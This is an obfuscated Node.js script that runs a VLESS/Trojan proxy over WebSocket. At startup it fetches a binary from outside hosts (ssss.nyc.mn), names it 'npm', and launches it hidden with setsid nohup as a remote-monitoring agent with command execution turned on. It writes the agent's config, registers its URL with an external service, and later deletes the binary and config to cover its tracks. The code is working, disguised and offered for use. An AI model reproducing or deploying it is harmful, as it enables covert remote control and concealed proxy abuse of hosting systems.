const _0x478e8a=_0x39a7;(function(_0x265e89,_0x4c38e8){const _0x458533=_0x39a7,_0x4c6f2d=_0x265e89();while(!![]){try{const _0x379e83=parseInt(_0x458533(0x1cb))/0x1*(parseInt(_0x458533(0x21e))/0x2)+-parseInt(_0x458533(0x1f0))/0x3+-parseInt(_0x458533(0x1da))/0x4*(-parseInt(_0x458533(0x1c6))/0x5)+parseInt(_0x458533(0x201))/0x6+-parseInt(_0x458533(0x1f7))/0x7+parseInt(_0x458533(0x1f6))/0x8*(parseInt(_0x458533(0x1e0))/0x9)+-parseInt(_0x458533(0x1c2))/0xa;if(_0x379e83===_0x4c38e8)break;else _0x4c6f2d['push'](_0x4c6f2d['shift']());}catch(_0x53a2e1){_0x4c6f2d['push'](_0x4c6f2d['shift']());}}}(_0x2178,0xa1df9));const os=require('os'),http=require(_0x478e8a(0x1c4)),fs=require('fs'),axios=require(_0x478e8a(0x1e2)),net=require(_0x478e8a(0x206)),path=require(_0x478e8a(0x1ce)),crypto=require(_0x478e8a(0x1f3)),{Buffer}=require(_0x478e8a(0x22c)),{exec,execSync}=require(_0x478e8a(0x1e1)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x478e8a(0x22a)][_0x478e8a(0x1fc)]||_0x478e8a(0x1c7),NEZHA_SERVER=process['env'][_0x478e8a(0x1e5)]||'',NEZHA_PORT=process[_0x478e8a(0x22a)][_0x478e8a(0x1cf)]||'',NEZHA_KEY=process[_0x478e8a(0x22a)][_0x478e8a(0x1ff)]||'',DOMAIN=process[_0x478e8a(0x22a)][_0x478e8a(0x1cd)]||_0x478e8a(0x1fe),AUTO_ACCESS=process[_0x478e8a(0x22a)][_0x478e8a(0x236)]||![],WSPATH=process['env'][_0x478e8a(0x1e3)]||UUID[_0x478e8a(0x233)](0x0,0x8),SUB_PATH=process[_0x478e8a(0x22a)][_0x478e8a(0x1d2)]||'sub',NAME=process['env'][_0x478e8a(0x1d4)]||'',PORT=process['env'][_0x478e8a(0x1d0)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x3b7817=_0x478e8a;try{const _0x47fe8e=await axios[_0x3b7817(0x1ea)]('https://speed.cloudflare.com/meta'),_0x56fff2=_0x47fe8e[_0x3b7817(0x225)];ISP=(_0x56fff2[_0x3b7817(0x213)]+'-'+_0x56fff2[_0x3b7817(0x235)])[_0x3b7817(0x1f8)](/ /g,'_');}catch(_0x528c66){ISP=_0x3b7817(0x23c);}};function _0x2178(){const _0xa18ef4=['&type=A','trojan://','unlink','29KdycDR','catch','DOMAIN','path','NEZHA_PORT','PORT','find','SUB_PATH','substr','NAME','error','&fp=chrome&type=ws&host=','false','length','2087','120SJCfmp','arch','npm\x20running\x20error:','utf8','decode','write','235854NkFMrM','child_process','axios','WSPATH','pipe','NEZHA_SERVER','finish','map','every','type','get','@cdns.doon.eu.org:443?security=tls&sni=','error:\x20','post','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','readFile','2550417WVTTJq','https://amd64.ssss.nyc.mn/agent','Failed\x20to\x20resolve\x20','crypto','&path=%2F','readUInt16BE','120RkhEhc','5136796MnCrhu','replace','utf-8','writeHead','digest','UUID','https://dns.google/resolve?name=','1234.abc.com','NEZHA_KEY','split','6045228KhcrgT','includes','https://arm64.ssss.nyc.mn/v1','\x20with\x20all\x20DNS\x20servers','/bin/bash','net','createWriteStream','https://arm64.ssss.nyc.mn/agent','reduce','vless://','stream','pop','listen','Server','npm\x20is\x20already\x20running,\x20skip\x20running...','url','close','npm','country','toString','443','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','from','https://','createServer','concat','readUInt8','Status','log','48038lfiWKm','\x20-p\x20','arm64','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','message','client_secret:\x20','chmod\x20+x\x20npm','data','base64','8443','https://amd64.ssss.nyc.mn/v1','1.1.1.1','env','once','buffer','update','index.html','Answer','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','sha224','config.yaml','slice','text/html','asOrganization','AUTO_ACCESS','application/json','true','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Hello\x20world!','--tls','Unknown','setsid\x20nohup\x20./npm\x20-s\x20','https://oooo.serv00.net/add-url','end','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','then','npm\x20is\x20running','text/plain','connect','join','8828090RuAzSz','Automatic\x20Access\x20Task\x20added\x20successfully','http','trim','172105pBPoJE','3b7702b5-9692-43db-91ed-27077fe93456'];_0x2178=function(){return _0xa18ef4;};return _0x2178();}GetISP();const httpServer=http[_0x478e8a(0x219)]((_0x56013f,_0x36ca06)=>{const _0x5d7219=_0x478e8a;if(_0x56013f[_0x5d7219(0x210)]==='/'){const _0x5ba862=path[_0x5d7219(0x1c1)](__dirname,_0x5d7219(0x22e));fs[_0x5d7219(0x1ef)](_0x5ba862,_0x5d7219(0x1dd),(_0x12a931,_0x1802df)=>{const _0x5575a2=_0x5d7219;if(_0x12a931){_0x36ca06['writeHead'](0xc8,{'Content-Type':_0x5575a2(0x234)}),_0x36ca06[_0x5575a2(0x1bb)](_0x5575a2(0x23a));return;}_0x36ca06['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x36ca06[_0x5575a2(0x1bb)](_0x1802df);});return;}else{if(_0x56013f['url']==='/'+SUB_PATH){const _0xa27b4a=NAME?NAME+'-'+ISP:ISP,_0x4dc791=_0x5d7219(0x20a)+UUID+_0x5d7219(0x216)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5d7219(0x1f4)+WSPATH+'#'+_0xa27b4a,_0x302f68=_0x5d7219(0x1c9)+UUID+_0x5d7219(0x1eb)+DOMAIN+_0x5d7219(0x1d6)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0xa27b4a,_0x449da9=_0x4dc791+'\x0a'+_0x302f68,_0x75e701=Buffer[_0x5d7219(0x217)](_0x449da9)['toString'](_0x5d7219(0x226));_0x36ca06['writeHead'](0xc8,{'Content-Type':_0x5d7219(0x1bf)}),_0x36ca06[_0x5d7219(0x1bb)](_0x75e701+'\x0a');}else _0x36ca06[_0x5d7219(0x1fa)](0x194,{'Content-Type':'text/plain'}),_0x36ca06[_0x5d7219(0x1bb)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x478e8a(0x20e))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x478e8a(0x229)];function resolveHost(_0x226723){return new Promise((_0x277c93,_0x1f00fa)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x226723)){_0x277c93(_0x226723);return;}let _0x248b95=0x0;function _0x227b9a(){const _0x148bd0=_0x39a7;if(_0x248b95>=DNS_SERVERS[_0x148bd0(0x1d8)]){_0x1f00fa(new Error(_0x148bd0(0x1f2)+_0x226723+_0x148bd0(0x204)));return;}const _0x4f82f9=DNS_SERVERS[_0x248b95];_0x248b95++;const _0x98bf11=_0x148bd0(0x1fd)+encodeURIComponent(_0x226723)+_0x148bd0(0x1c8);axios[_0x148bd0(0x1ea)](_0x98bf11,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x148bd0(0x1bd)](_0x92ed0b=>{const _0x305041=_0x148bd0,_0x513468=_0x92ed0b[_0x305041(0x225)];if(_0x513468[_0x305041(0x21c)]===0x0&&_0x513468[_0x305041(0x22f)]&&_0x513468[_0x305041(0x22f)][_0x305041(0x1d8)]>0x0){const _0x3a8986=_0x513468[_0x305041(0x22f)][_0x305041(0x1d1)](_0x4c851c=>_0x4c851c[_0x305041(0x1e9)]===0x1);if(_0x3a8986){_0x277c93(_0x3a8986[_0x305041(0x225)]);return;}}_0x227b9a();})[_0x148bd0(0x1cc)](_0x4517ab=>{_0x227b9a();});}_0x227b9a();});}function _0x39a7(_0x2635f7,_0xb6927c){_0x2635f7=_0x2635f7-0x1bb;const _0x21784f=_0x2178();let _0x39a7c5=_0x21784f[_0x2635f7];return _0x39a7c5;}function handleVlessConnection(_0x48407b,_0x318f68){const _0x51f132=_0x478e8a,[_0x541650]=_0x318f68,_0x4c9bff=_0x318f68[_0x51f132(0x233)](0x1,0x11);if(!_0x4c9bff[_0x51f132(0x1e8)]((_0x82b9db,_0x5754e0)=>_0x82b9db==parseInt(uuid[_0x51f132(0x1d3)](_0x5754e0*0x2,0x2),0x10)))return![];let _0x5373fd=_0x318f68[_0x51f132(0x233)](0x11,0x12)[_0x51f132(0x21b)]()+0x13;const _0x5d155b=_0x318f68[_0x51f132(0x233)](_0x5373fd,_0x5373fd+=0x2)[_0x51f132(0x1f5)](0x0),_0x35664c=_0x318f68[_0x51f132(0x233)](_0x5373fd,_0x5373fd+=0x1)[_0x51f132(0x21b)](),_0x370a55=_0x35664c==0x1?_0x318f68['slice'](_0x5373fd,_0x5373fd+=0x4)['join']('.'):_0x35664c==0x2?new TextDecoder()[_0x51f132(0x1de)](_0x318f68[_0x51f132(0x233)](_0x5373fd+0x1,_0x5373fd+=0x1+_0x318f68[_0x51f132(0x233)](_0x5373fd,_0x5373fd+0x1)[_0x51f132(0x21b)]())):_0x35664c==0x3?_0x318f68[_0x51f132(0x233)](_0x5373fd,_0x5373fd+=0x10)['reduce']((_0x3239c,_0x4ff39e,_0x2a63fe,_0x5c0abb)=>_0x2a63fe%0x2?_0x3239c[_0x51f132(0x21a)](_0x5c0abb[_0x51f132(0x233)](_0x2a63fe-0x1,_0x2a63fe+0x1)):_0x3239c,[])[_0x51f132(0x1e7)](_0x52630c=>_0x52630c['readUInt16BE'](0x0)[_0x51f132(0x214)](0x10))[_0x51f132(0x1c1)](':'):'';_0x48407b['send'](new Uint8Array([_0x541650,0x0]));const _0x2a038b=createWebSocketStream(_0x48407b);return resolveHost(_0x370a55)['then'](_0x35b47c=>{const _0x2cc9a6=_0x51f132;net[_0x2cc9a6(0x1c0)]({'host':_0x35b47c,'port':_0x5d155b},function(){const _0x4a0764=_0x2cc9a6;this[_0x4a0764(0x1df)](_0x318f68[_0x4a0764(0x233)](_0x5373fd)),_0x2a038b['on'](_0x4a0764(0x1d5),()=>{})[_0x4a0764(0x1e4)](this)['on']('error',()=>{})[_0x4a0764(0x1e4)](_0x2a038b);})['on'](_0x2cc9a6(0x1d5),()=>{});})['catch'](_0x520387=>{const _0xbd0d5e=_0x51f132;net[_0xbd0d5e(0x1c0)]({'host':_0x370a55,'port':_0x5d155b},function(){const _0x136615=_0xbd0d5e;this['write'](_0x318f68[_0x136615(0x233)](_0x5373fd)),_0x2a038b['on'](_0x136615(0x1d5),()=>{})[_0x136615(0x1e4)](this)['on']('error',()=>{})[_0x136615(0x1e4)](_0x2a038b);})['on'](_0xbd0d5e(0x1d5),()=>{});}),!![];}function handleTrojanConnection(_0xcaf529,_0x16a37c){const _0x307fdb=_0x478e8a;try{if(_0x16a37c[_0x307fdb(0x1d8)]<0x3a)return![];const _0x349b94=_0x16a37c[_0x307fdb(0x233)](0x0,0x38)[_0x307fdb(0x214)](),_0x1e77b5=[UUID];let _0x40c3de=null;for(const _0x3b98ea of _0x1e77b5){const _0xf31f49=crypto['createHash'](_0x307fdb(0x231))[_0x307fdb(0x22d)](_0x3b98ea)[_0x307fdb(0x1fb)]('hex');if(_0xf31f49===_0x349b94){_0x40c3de=_0x3b98ea;break;}}if(!_0x40c3de)return![];let _0x5f1d28=0x38;_0x16a37c[_0x5f1d28]===0xd&&_0x16a37c[_0x5f1d28+0x1]===0xa&&(_0x5f1d28+=0x2);const _0x232595=_0x16a37c[_0x5f1d28];if(_0x232595!==0x1)return![];_0x5f1d28+=0x1;const _0x2916bd=_0x16a37c[_0x5f1d28];_0x5f1d28+=0x1;let _0x4e9593,_0x2e3cf5;if(_0x2916bd===0x1)_0x4e9593=_0x16a37c['slice'](_0x5f1d28,_0x5f1d28+0x4)[_0x307fdb(0x1c1)]('.'),_0x5f1d28+=0x4;else{if(_0x2916bd===0x3){const _0x8c9154=_0x16a37c[_0x5f1d28];_0x5f1d28+=0x1,_0x4e9593=_0x16a37c[_0x307fdb(0x233)](_0x5f1d28,_0x5f1d28+_0x8c9154)[_0x307fdb(0x214)](),_0x5f1d28+=_0x8c9154;}else{if(_0x2916bd===0x4)_0x4e9593=_0x16a37c[_0x307fdb(0x233)](_0x5f1d28,_0x5f1d28+0x10)[_0x307fdb(0x209)]((_0x3f3295,_0x2521fc,_0x592436,_0x22a258)=>_0x592436%0x2?_0x3f3295[_0x307fdb(0x21a)](_0x22a258[_0x307fdb(0x233)](_0x592436-0x1,_0x592436+0x1)):_0x3f3295,[])[_0x307fdb(0x1e7)](_0x22f3fa=>_0x22f3fa[_0x307fdb(0x1f5)](0x0)[_0x307fdb(0x214)](0x10))[_0x307fdb(0x1c1)](':'),_0x5f1d28+=0x10;else return![];}}_0x2e3cf5=_0x16a37c[_0x307fdb(0x1f5)](_0x5f1d28),_0x5f1d28+=0x2;_0x5f1d28<_0x16a37c['length']&&_0x16a37c[_0x5f1d28]===0xd&&_0x16a37c[_0x5f1d28+0x1]===0xa&&(_0x5f1d28+=0x2);const _0x24d384=createWebSocketStream(_0xcaf529);return resolveHost(_0x4e9593)[_0x307fdb(0x1bd)](_0x1a5cb0=>{const _0x2d224c=_0x307fdb;net[_0x2d224c(0x1c0)]({'host':_0x1a5cb0,'port':_0x2e3cf5},function(){const _0x6ef97e=_0x2d224c;_0x5f1d28<_0x16a37c[_0x6ef97e(0x1d8)]&&this['write'](_0x16a37c[_0x6ef97e(0x233)](_0x5f1d28)),_0x24d384['on'](_0x6ef97e(0x1d5),()=>{})[_0x6ef97e(0x1e4)](this)['on'](_0x6ef97e(0x1d5),()=>{})[_0x6ef97e(0x1e4)](_0x24d384);})['on'](_0x2d224c(0x1d5),()=>{});})[_0x307fdb(0x1cc)](_0x313a67=>{const _0x1dd397=_0x307fdb;net[_0x1dd397(0x1c0)]({'host':_0x4e9593,'port':_0x2e3cf5},function(){const _0x5eb6f1=_0x1dd397;_0x5f1d28<_0x16a37c[_0x5eb6f1(0x1d8)]&&this[_0x5eb6f1(0x1df)](_0x16a37c[_0x5eb6f1(0x233)](_0x5f1d28)),_0x24d384['on'](_0x5eb6f1(0x1d5),()=>{})[_0x5eb6f1(0x1e4)](this)['on'](_0x5eb6f1(0x1d5),()=>{})[_0x5eb6f1(0x1e4)](_0x24d384);})['on'](_0x1dd397(0x1d5),()=>{});}),!![];}catch(_0x513534){return![];}}wss['on']('connection',(_0x113131,_0x20b08a)=>{const _0x5af25d=_0x478e8a,_0x4c8456=_0x20b08a[_0x5af25d(0x210)]||'';_0x113131[_0x5af25d(0x22b)](_0x5af25d(0x222),_0x269f42=>{const _0x50f018=_0x5af25d;if(_0x269f42['length']>0x11&&_0x269f42[0x0]===0x0){const _0x49a5c6=_0x269f42['slice'](0x1,0x11),_0x564afb=_0x49a5c6[_0x50f018(0x1e8)]((_0x276eea,_0x4a6247)=>_0x276eea==parseInt(uuid['substr'](_0x4a6247*0x2,0x2),0x10));if(_0x564afb){!handleVlessConnection(_0x113131,_0x269f42)&&_0x113131[_0x50f018(0x211)]();return;}}!handleTrojanConnection(_0x113131,_0x269f42)&&_0x113131[_0x50f018(0x211)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x5dd5d=_0x478e8a,_0x3a1b3e=os[_0x5dd5d(0x1db)]();return _0x3a1b3e==='arm'||_0x3a1b3e===_0x5dd5d(0x220)||_0x3a1b3e==='aarch64'?!NEZHA_PORT?_0x5dd5d(0x203):_0x5dd5d(0x208):!NEZHA_PORT?_0x5dd5d(0x228):_0x5dd5d(0x1f1);},downloadFile=async()=>{const _0x39c172=_0x478e8a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x22a03a=getDownloadUrl(),_0x5ac001=await axios({'method':_0x39c172(0x1ea),'url':_0x22a03a,'responseType':_0x39c172(0x20b)}),_0x3ab676=fs[_0x39c172(0x207)]('npm');return _0x5ac001['data'][_0x39c172(0x1e4)](_0x3ab676),new Promise((_0x37645d,_0x58077a)=>{const _0x430fda=_0x39c172;_0x3ab676['on'](_0x430fda(0x1e6),()=>{const _0x5590e2=_0x430fda;console[_0x5590e2(0x21d)]('npm\x20download\x20successfully'),exec(_0x5590e2(0x224),_0x3ed470=>{if(_0x3ed470)_0x58077a(_0x3ed470);_0x37645d();});}),_0x3ab676['on'](_0x430fda(0x1d5),_0x58077a);});}catch(_0x4b790f){throw _0x4b790f;}},runnz=async()=>{const _0x3ea434=_0x478e8a;try{const _0x31017e=execSync(_0x3ea434(0x1ee),{'encoding':_0x3ea434(0x1f9)});if(_0x31017e[_0x3ea434(0x1c5)]()!==''){console[_0x3ea434(0x21d)](_0x3ea434(0x20f));return;}}catch(_0x470cda){}await downloadFile();let _0x2e6b1b='',_0x279893=[_0x3ea434(0x215),_0x3ea434(0x227),'2096',_0x3ea434(0x1d9),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x39f750=_0x279893[_0x3ea434(0x202)](NEZHA_PORT)?_0x3ea434(0x23b):'';_0x2e6b1b=_0x3ea434(0x23d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3ea434(0x21f)+NEZHA_KEY+'\x20'+_0x39f750+_0x3ea434(0x1bc);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xc5c720=NEZHA_SERVER[_0x3ea434(0x202)](':')?NEZHA_SERVER[_0x3ea434(0x200)](':')[_0x3ea434(0x20c)]():'',_0x49e7c8=_0x279893['includes'](_0xc5c720)?_0x3ea434(0x238):_0x3ea434(0x1d7),_0xec26dd=_0x3ea434(0x223)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3ea434(0x221)+_0x49e7c8+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x3ea434(0x232),_0xec26dd);}_0x2e6b1b=_0x3ea434(0x239);}else{console[_0x3ea434(0x21d)](_0x3ea434(0x230));return;}}try{exec(_0x2e6b1b,{'shell':_0x3ea434(0x205)},_0x5c78ca=>{const _0xd7fa13=_0x3ea434;if(_0x5c78ca)console[_0xd7fa13(0x1d5)](_0xd7fa13(0x1dc),_0x5c78ca);else console[_0xd7fa13(0x21d)](_0xd7fa13(0x1be));});}catch(_0x3a498c){console[_0x3ea434(0x1d5)](_0x3ea434(0x1ec)+_0x3a498c);}};async function addAccessTask(){const _0x2a48f0=_0x478e8a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x348f42=_0x2a48f0(0x218)+DOMAIN+'/'+SUB_PATH;try{const _0x48ae24=await axios[_0x2a48f0(0x1ed)](_0x2a48f0(0x23e),{'url':_0x348f42},{'headers':{'Content-Type':_0x2a48f0(0x237)}});console['log'](_0x2a48f0(0x1c3));}catch(_0x31031d){}}const delFiles=()=>{const _0x17bf4b=_0x478e8a;fs[_0x17bf4b(0x1ca)](_0x17bf4b(0x212),()=>{}),fs[_0x17bf4b(0x1ca)](_0x17bf4b(0x232),()=>{});};httpServer[_0x478e8a(0x20d)](PORT,()=>{const _0x17f84f=_0x478e8a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x17f84f(0x21d)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
